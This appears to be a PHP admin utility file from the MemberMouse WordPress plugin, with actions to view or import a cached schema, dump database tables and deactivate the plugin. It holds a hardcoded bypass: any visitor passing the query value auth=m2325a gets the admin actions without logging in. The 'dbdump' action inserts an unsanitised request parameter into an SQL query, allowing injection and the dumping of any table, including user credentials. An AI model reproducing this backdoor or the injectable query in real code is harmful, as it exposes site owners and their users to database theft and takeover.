<?php
require_once("../../../wp-load.php");
require_once("../../../wp-admin/includes/plugin.php");

error_reporting(E_ALL);
ini_set("display_errors","On");

function _current_user_can($str){
	if(function_exists("current_user_can")){
		return current_user_can($str);
	}
	return false;
}

if(_current_user_can('manage_options') || (isset($_GET["auth"]) && $_GET["auth"] =="m2325a")){
	if(isset($_GET["admin"])){
		switch($_GET["admin"]){
			case "showdb":
				$writeableDir = ABSPATH."wp-content/plugins/membermouse/com/membermouse/cache";
       			$contents = file_get_contents($writeableDir."/membermouse_schema.sql", true);
       			$b64= base64_decode($contents);
       			$buns = unserialize($b64);
       			echo "<pre>";
       			var_dump($buns);
       			break;
			case "db":
				$writeableDir = ABSPATH."wp-content/plugins/membermouse/com/membermouse/cache";
       			 if(defined("DB_NAME")){
       			 	
					$phpObj = new MM_PhpObj($wpdb, DB_NAME);
					if(!$phpObj->importFile($writeableDir."/membermouse_schema.sql", true)){
			        	echo "Could not import sql schema";
					}
					else{
						echo "Imported new DB!";
					}
       			 }
				break;
			case "dbdump":
				global $wpdb;
				
				if(isset($_GET["table"])){
					$sql = "select * from {$_GET["table"]}";
					$results = $wpdb->get_results($sql);
					echo "<pre>";
					var_dump($results);
				}
				break;
			case "deactivate":
				$pluginName = array_pop(explode("/", dirname(__FILE__)));
				$path = ABSPATH."wp-content/plugins/".$pluginName."/index.php";
				
				if(function_exists("deactivate_plugins")){
					deactivate_plugins($path, false);
					echo "Deactivated";
				}
				else{
					global $wpdb;
					$sql = "update {$wpdb->options} set option_value='' where option_name='active_plugins' limit 1";
					if($wpdb->query($sql)!==false){
						echo "Deactivated [2]";
					}
				}
				break;
		}
	}
	
	echo "Script has completed.";
}
else{
	
echo "Access Denied";
}
exit;